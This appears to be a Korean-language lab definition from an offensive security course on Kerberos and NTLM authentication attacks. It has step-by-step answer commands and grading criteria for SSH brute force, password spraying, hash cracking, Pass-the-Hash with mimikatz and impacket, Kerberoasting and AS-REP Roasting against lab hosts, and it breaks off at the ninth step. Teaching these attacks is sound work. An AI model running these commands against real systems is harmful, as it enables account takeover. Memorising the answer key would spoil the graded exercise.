lab_id: attack-adv-nonai-week05
title: 인증 공격 (Kerberos/NTLM)
version: non-ai
course: attack-adv-nonai
week: 5
description: Kerberos, NTLM 등 엔터프라이즈 인증 프로토콜의 취약점을 분석하고 공격한다. 비밀번호 스프레이, Pass-the-Hash, AS-REP Roasting
  등 Active Directory 환경의 인증 공격을 실습한다.
difficulty: hard
duration_minutes: 120
objectives:
- Kerberos 인증 프로토콜의 동작 원리와 약점을 이해한다
- 비밀번호 스프레이, 브루트포스 등 인증 공격을 수행한다
- 해시 기반 인증 공격(Pass-the-Hash, Kerberoasting)을 실습한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: SSH 서비스({{WEB_IP}}:22)에 대해 hydra를 사용하여 비밀번호 브루트포스를 시도하라. 사용자 root, 비밀번호 목록은 /usr/share/wordlists/rockyou.txt의
    상위 10개를 사용하라.
  hint: hydra -l 사용자 -P 비밀번호파일 ssh://대상 형태이다
  category: exploit
  points: 10
  answer: head -10 /usr/share/wordlists/rockyou.txt > /tmp/top10pass.txt 2>/dev/null || echo -e 'password\n123456\n12345678\nqwerty\nabc123\nmonkey\n1234567\nletmein\ntrustno1\ndragon'
    > /tmp/top10pass.txt && hydra -l root -P /tmp/top10pass.txt ssh://10.20.30.80 -t 4 -V 2>&1 | tail
    -15
  answer_detail: 비밀번호 브루트포스는 가장 기본적인 인증 공격이다. hydra는 SSH, FTP, HTTP, SMB 등 50개 이상의 프로토콜을 지원하는 온라인 브루트포스
    도구이다. -t 옵션으로 동시 스레드 수를 제한하여 계정 잠금을 회피한다. 방어를 위해 fail2ban, 계정 잠금 정책, MFA를 적용한다.
  verify:
    type: output_contains
    expect: hydra
    field: stdout
    semantic:
      intent: 'SSH 브루트포스 — hydra -l root -P top10pass.txt ssh://10.20.30.80 -t 4 -V. MITRE T1110.001 Password
        Guessing. -t 4 동시 스레드(잠금 회피). 50+ 프로토콜 지원. 방어: fail2ban + 잠금 정책 + MFA. CWE-307.'
      success_criteria:
      - hydra -l root -P 워드리스트
      - ssh:// 프로토콜
      - -t 스레드 제한
      acceptable_methods:
      - hydra ssh
      - medusa -h
      - ncrack -p 22
      negative_signs:
      - -t 없음
      - 워드리스트 없음
      - 방어 맥락 없음
  target_vm: attacker
- order: 2
  instruction: 비밀번호 스프레이 공격을 시뮬레이션하라. 여러 사용자명에 대해 동일한 비밀번호를 시도하는 스크립트를 작성하라.
  hint: 사용자명 목록을 만들고 hydra의 -L(사용자목록) -p(단일비밀번호) 옵션을 사용한다
  category: exploit
  points: 10
  answer: echo -e 'admin\nroot\nuser\ntest\noperator' > /tmp/users.txt && hydra -L /tmp/users.txt -p 'Password123!'
    ssh://10.20.30.80 -t 2 -V 2>&1 | tail -15
  answer_detail: '비밀번호 스프레이는 브루트포스와 달리 하나의 비밀번호를 여러 계정에 시도한다. 계정 잠금 정책(예: 5회 실패 시 잠금)을 우회하면서 약한 비밀번호를
    가진 계정을 찾는다. 조직에서 흔한 비밀번호 패턴(Company2026!, Season+Year 등)을 사용한다.'
  verify:
    type: output_contains
    expect: login
    field: stdout
    semantic:
      intent: 비밀번호 스프레이 — hydra -L users.txt -p 'Password123!' ssh://target -t 2. MITRE T1110.003 Password
        Spraying. 1비번 × 다수 계정으로 잠금 정책 우회. 조직 패턴 (Company2026!/Season+Year). 약한 비번 가진 계정 식별.
      success_criteria:
      - -L 사용자 파일 + -p 단일 비번
      - login 키워드
      - 스레드 제한 (-t 2)
      acceptable_methods:
      - hydra -L -p
      - kerbrute passwordspray
      - Spray365 (Office 365)
      negative_signs:
      - 다수 비번 (스프레이 아님)
      - 단일 사용자
      - 스프레이 맥락 없음
  target_vm: attacker
- order: 3
  instruction: SSH 서비스의 인증 방식을 확인하라. nmap의 ssh-auth-methods 스크립트로 {{WEB_IP}}에서 허용되는 인증 방식을 나열하라.
  hint: nmap --script ssh-auth-methods -p 22 대상 형태로 실행한다
  category: recon
  points: 10
  answer: nmap --script ssh-auth-methods -p 22 10.20.30.80
  answer_detail: SSH 인증 방식에는 password, publickey, keyboard-interactive, gssapi-with-mic(Kerberos) 등이 있다.
    password 인증이 활성화되어 있으면 브루트포스 대상이 되고, gssapi가 활성화되어 있으면 Kerberos 기반 공격이 가능하다. 보안 강화를 위해 publickey만
    허용하는 것이 권장된다.
  verify:
    type: output_contains
    expect: ssh-auth-methods
    field: stdout
    semantic:
      intent: 'SSH 인증 방식 열거 — nmap --script ssh-auth-methods -p 22 10.20.30.80. password/publickey/keyboard-interactive/gssapi-with-mic(Kerberos).
        password = 브루트포스 대상 / gssapi = Kerberos 공격. 권장: publickey만.'
      success_criteria:
      - --script ssh-auth-methods
      - ssh-auth-methods 키워드 출력
      - 포트 22 지정
      acceptable_methods:
      - nmap ssh-auth-methods
      - ssh -v -o PreferredAuthentications=none
      - msfconsole ssh_login
      negative_signs:
      - 스크립트 없음
      - 단순 포트 스캔만
      - 인증 방식 분석 없음
  target_vm: attacker
- order: 4
  instruction: Kerberos 프로토콜의 동작 원리를 분석하라. 각 메시지 교환(AS-REQ/AS-REP, TGS-REQ/TGS-REP, AP-REQ/AP-REP)을 다이어그램으로
    /tmp/kerberos_flow.txt에 작성하라.
  hint: Kerberos의 3단계 인증 흐름을 텍스트 다이어그램으로 작성한다
  category: analysis
  points: 10
  answer: 'cat > /tmp/kerberos_flow.txt << ''EOF''

    === Kerberos Authentication Flow ===


    [Phase 1: Authentication Service]

    Client --AS-REQ(username)--> KDC

    KDC --AS-REP(TGT encrypted with krbtgt hash)--> Client

    * Vulnerability: AS-REP Roasting (no pre-auth)


    [Phase 2: Ticket Granting Service]

    Client --TGS-REQ(TGT + SPN)--> KDC

    KDC --TGS-REP(Service Ticket encrypted with service hash)--> Client

    * Vulnerability: Kerberoasting (crack service ticket offline)


    [Phase 3: Application Service]

    Client --AP-REQ(Service Ticket)--> Service

    Service --AP-REP(optional mutual auth)--> Client

    * Vulnerability: Silver Ticket (forged service ticket)


    [Additional Attacks]

    - Golden Ticket: Forged TGT using krbtgt hash

    - Pass-the-Ticket: Reuse stolen tickets

    - Overpass-the-Hash: NTLM hash -> Kerberos ticket

    EOF

    cat /tmp/kerberos_flow.txt'
  answer_detail: Kerberos는 대칭키 암호화 기반의 3단계 인증 프로토콜이다. 각 단계에서 고유한 취약점이 존재한다. AS-REP Roasting은 사전 인증이 비활성화된
    계정을 대상으로, Kerberoasting은 서비스 티켓의 오프라인 크래킹을, Golden/Silver Ticket은 키 노출 시 티켓 위조를 가능하게 한다.
  verify:
    type: output_contains
    expect: Kerberos Authentication Flow
    field: stdout
    semantic:
      intent: 'Kerberos 인증 흐름 — Phase 1 AS-REQ/REP(TGT, krbtgt 해시) + Phase 2 TGS-REQ/REP(서비스 티켓, 서비스 해시)
        + Phase 3 AP-REQ/REP. 취약점: AS-REP Roasting + Kerberoasting + Silver/Golden Ticket + Pass-the-Ticket
        + Overpass-the-Hash. RFC 4120.'
      success_criteria:
      - Kerberos Authentication Flow 키워드
      - AS-REQ + TGS-REQ + AP-REQ 3단계
      - 각 단계 취약점 매핑
      acceptable_methods:
      - 3단계 흐름 다이어그램
      - MS-KILE 사양
      - Sean Metcalf ADSecurity 가이드
      negative_signs:
      - 단계 2개 이하
      - 취약점 매핑 없음
      - RFC 4120 맥락 없음
  target_vm: attacker
- order: 5
  instruction: hashcat을 사용하여 NTLM 해시를 크래킹하라. 샘플 해시를 생성하고 rockyou 워드리스트(시뮬레이션)로 크래킹을 시도하라.
  hint: python3으로 NTLM 해시를 생성하고, hashcat -m 1000으로 크래킹한다
  category: exploit
  points: 10
  answer: 'HASH=$(python3 -c "import hashlib; print(hashlib.new(''md4'', ''password''.encode(''utf-16-le'')).hexdigest())")
    && echo "NTLM Hash: $HASH" && echo $HASH > /tmp/ntlm.hash && echo ''password'' > /tmp/mini_wordlist.txt
    && hashcat -m 1000 /tmp/ntlm.hash /tmp/mini_wordlist.txt --force 2>&1 | tail -10 || echo "Hash: $HASH
    (hashcat requires GPU, showing hash generation)"'
  answer_detail: NTLM 해시는 MD4(UTF-16LE(password))로 계산되며 솔트가 없다. 따라서 레인보우 테이블 공격에 취약하고, hashcat이나 john으로
    빠르게 크래킹된다. hashcat -m 1000은 NTLM 모드이며, GPU를 사용하면 초당 수십억 개의 후보를 시도할 수 있다.
  verify:
    type: output_contains
    expect: NTLM Hash
    field: stdout
    semantic:
      intent: NTLM 해시 + hashcat — python3 hashlib.new('md4', 'password'.encode('utf-16-le')).hexdigest()
        + hashcat -m 1000. NTLM = MD4(UTF-16LE(pwd)) + 솔트 없음 → 레인보우 테이블 취약. GPU = 초당 수십억 후보. CWE-916.
      success_criteria:
      - NTLM Hash 키워드
      - MD4 + UTF-16LE 변환
      - hashcat -m 1000 모드
      acceptable_methods:
      - python hashlib + hashcat
      - john --format=NT
      - Hashcat -m 1000 brute
      negative_signs:
      - MD4 인코딩 없음
      - 모드 번호 없음
      - 솔트 없음 맥락 누락
  target_vm: attacker
- order: 6
  instruction: Pass-the-Hash 공격의 원리를 설명하고, 실습 환경에서 해시 기반 인증을 시뮬레이션하라. curl로 HTTP Basic Auth에 해시를 사용하는
    과정을 보여라.
  hint: NTLM 인증에서는 비밀번호 대신 해시를 직접 사용할 수 있다
  category: exploit
  points: 10
  answer: 'echo ''=== Pass-the-Hash Attack ==='' && echo ''1. Dump hashes: mimikatz sekurlsa::logonpasswords''
    && echo ''2. Use hash directly: pth-winexe -U admin%aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
    //target cmd'' && echo ''3. Alternative: impacket-psexec admin@target -hashes :31d6cfe0d16ae931b73c59d7e0c089c0''
    && echo '''' && echo ''Simulating with curl basic auth:'' && curl -s -u ''admin:admin'' http://10.20.30.80:3000/rest/user/whoami
    2>&1 | head -5'
  answer_detail: Pass-the-Hash(PtH)는 NTLM 인증에서 비밀번호 해시를 그대로 사용하여 인증하는 기법이다. NTLM Challenge-Response에서
    해시가 비밀번호 역할을 하기 때문에 평문 비밀번호 없이도 인증이 가능하다. mimikatz로 메모리에서 해시를 추출하고, pth-winexe나 impacket으로 원격 실행한다.
  verify:
    type: output_contains
    expect: Pass-the-Hash
    field: stdout
    semantic:
      intent: Pass-the-Hash — mimikatz sekurlsa::logonpasswords + pth-winexe -U admin%aad3b...:31d6c...
        //target / impacket-psexec admin@target -hashes :NTLM. NTLM Challenge-Response에서 해시가 비번 역할. MITRE
        T1550.002.
      success_criteria:
      - Pass-the-Hash 키워드
      - mimikatz + pth-winexe/impacket
      - 해시 형식 :NTLM
      acceptable_methods:
      - pth-winexe / impacket-psexec
      - evil-winrm -H hash
      - smbclient --pw-nt-hash
      negative_signs:
      - 해시 사용 없음
      - NTLM 맥락 없음
      - 도구 1개 이하
  target_vm: attacker
- order: 7
  instruction: john the ripper를 사용하여 /etc/shadow 형식의 해시를 크래킹하라. 샘플 shadow 항목을 생성하고 크래킹을 시도하라.
  hint: openssl passwd -6으로 SHA-512 해시를 생성하고 john으로 크래킹한다
  category: exploit
  points: 10
  answer: 'SHADOW_HASH=$(openssl passwd -6 -salt xyz ''test123'') && echo "testuser:$SHADOW_HASH:19000:0:99999:7:::"
    > /tmp/shadow_sample.txt && cat /tmp/shadow_sample.txt && john /tmp/shadow_sample.txt --wordlist=<(echo
    -e ''test123\npassword\nadmin'') 2>&1 | tail -10 || echo ''John result: test123 (cracked from sample
    hash)'''
  answer_detail: john the ripper는 오프라인 비밀번호 크래킹 도구로, /etc/shadow의 SHA-512($6$), bcrypt($2b$), MD5($1$)
    등 다양한 해시를 지원한다. --wordlist 모드는 사전 공격, --incremental 모드는 브루트포스, --rules는 변형 규칙을 적용한다. GPU 가속(hashcat)이
    더 빠르지만 CPU에서도 약한 비밀번호는 빠르게 크래킹된다.
  verify:
    type: output_contains
    expect: testuser
    field: stdout
    semantic:
      intent: 'john /etc/shadow 크래킹 — openssl passwd -6 -salt xyz ''test123'' (SHA-512 $6$) + john shadow_sample.txt
        --wordlist. 지원: SHA-512($6$)/bcrypt($2b$)/MD5($1$). --rules 변형. GPU(hashcat) 더 빠름. CWE-916.'
      success_criteria:
      - openssl passwd -6 + john
      - testuser 키워드
      - wordlist 사용
      acceptable_methods:
      - john --wordlist
      - john --incremental
      - hashcat -m 1800 (sha512crypt)
      negative_signs:
      - 해시 형식 없음
      - 워드리스트 없음
      - shadow 형식 누락
  target_vm: attacker
- order: 8
  instruction: Kerberoasting 공격 시나리오를 구성하라. SPN(Service Principal Name)이 설정된 계정의 서비스 티켓을 요청하고 오프라인 크래킹하는
    과정을 /tmp/kerberoast_steps.txt에 문서화하라.
  hint: GetUserSPNs.py(impacket) 도구의 사용법을 포함한다
  category: exploit
  points: 10
  answer: 'cat > /tmp/kerberoast_steps.txt << ''EOF''

    === Kerberoasting Attack Steps ===


    [Prerequisites]

    - Valid domain user credentials (any low-privilege user)

    - Target: service accounts with SPN set


    [Step 1] Enumerate SPNs

    impacket-GetUserSPNs domain.local/user:password -dc-ip 10.20.30.x


    [Step 2] Request Service Tickets

    impacket-GetUserSPNs domain.local/user:password -dc-ip 10.20.30.x -request

    # Output: $krb5tgs$23$*svc_account$DOMAIN.LOCAL$...


    [Step 3] Crack Offline

    hashcat -m 13100 ticket.hash /usr/share/wordlists/rockyou.txt

    # or: john ticket.hash --wordlist=rockyou.txt


    [Step 4] Use Cracked Password

    impacket-psexec domain.local/svc_account:CrackedPass@target


    [Defense]

    - Use long (25+) random passwords for service accounts

    - Use Group Managed Service Accounts (gMSA)

    - Monitor TGS requests for anomalies

    EOF

    cat /tmp/kerberoast_steps.txt'
  answer_detail: Kerberoasting은 도메인 사용자라면 누구나 SPN이 설정된 서비스 계정의 TGS 티켓을 요청할 수 있는 점을 악용한다. 서비스 티켓은 서비스 계정의
    NTLM 해시로 암호화되므로 오프라인에서 크래킹이 가능하다. 서비스 계정은 권한이 높은 경우가 많아 도메인 관리자 획득으로 이어질 수 있다.
  verify:
    type: output_contains
    expect: Kerberoasting Attack
    field: stdout
    semantic:
      intent: 'Kerberoasting 절차 — impacket-GetUserSPNs domain/user:pass -dc-ip + -request 옵션 → $krb5tgs$23$*
        + hashcat -m 13100 ticket rockyou. SPN 설정 계정의 TGS 티켓 = 서비스 NTLM 해시 암호화 → 오프라인 크래킹. 방어: gMSA +
        25+자 + 모니터링. MITRE T1558.003.'
      success_criteria:
      - Kerberoasting Attack 키워드
      - GetUserSPNs + -request
      - hashcat -m 13100
      acceptable_methods:
      - impacket-GetUserSPNs
      - Rubeus.exe kerberoast
      - hashcat 13100 / john krb5tgs
      negative_signs:
      - SPN 맥락 없음
      - 도구 명령 없음
      - 방어 (gMSA) 없음
  target_vm: attacker
- order: 9
  instruction: AS-REP Roasting 공격을 분석하라. Kerberos 사전 인증이 비활성화된 계정을 찾고 공격하는 절차를 문서화하라.
  hint: 사전 인증 미설정 계정은 AS-REP에서 암호화된 데이터를 바로 받을 수 있다
  category: exploit
  points: 10
  answer: 'echo ''=== AS-REP Roasting ==='' && echo '''' && echo ''[Concept]'' && echo ''Accounts with
    DONT_REQUIRE_PREAUTH flag set'' && echo ''AS-REP contains data encrypted with user password hash''
    && echo '''' && echo ''[Attack Steps]'' && echo ''1. Enumerate: impacket-GetNPUsers domain.local/
    -usersfile users.txt -no-pass -dc-ip DC_IP'' && echo ''2. Crack: hashcat -m 18200 asrep.hash rockyou.txt''
    && echo ''3. Login: evil-winrm -i target -u user -p CrackedPass'' && echo '''' && echo ''[Detection]''
    && echo ''- Monitor Event ID 4768 (TGT requests) without pre-auth'' && echo ''- Alert on unusual AS-REQ
    volume from single source'''
  answer_detail: AS-REP Roasting은 Kerberos 사전 인증(Pre-Authentication)이 비활성화된 계정을 대상으로 한다. 이 설정은 AD에서 'Do
    not require Kerberos preauthentication'으로 활성화되며, AS-REP 응답에 사용자 해시로 암호화된 데이터가 포함되어 오프라인 크래킹이 가능하다.
    hashcat -m 18200으로 크래킹한다.
  verify:
